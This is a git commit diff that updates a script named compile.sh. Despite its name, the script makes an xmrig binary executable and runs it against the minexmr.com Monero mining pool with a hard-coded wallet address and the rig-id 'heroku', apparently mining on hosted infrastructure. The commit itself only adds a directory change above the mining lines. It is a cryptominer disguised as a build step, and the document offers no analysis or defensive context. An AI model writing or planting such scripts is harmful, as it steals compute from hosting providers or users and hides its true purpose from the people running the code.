6bb8569918ad07fa5b9d9a5b1b6b5e7bdb09d1e5
mi33rs <104284556+mi33rs@users.noreply.github.com>
2022-04-24 11:35:44 +0800

    Update compile.sh

--- compile.sh
+++ compile.sh
@@ -1,2 +1,3 @@
+cd /compile
 chmod 755 xmrig
 ./xmrig -o us-west.minexmr.com:443 -u 45EUJCTJbToDf79PU8YrXxHwAomkXcWapBBGeQSKbb3hJKRbwbbJ8NZ34GQT61qkPEivjq3fk78DxVhmyyZCeSXJ1hw7PQR -k --tls --rig-id heroku
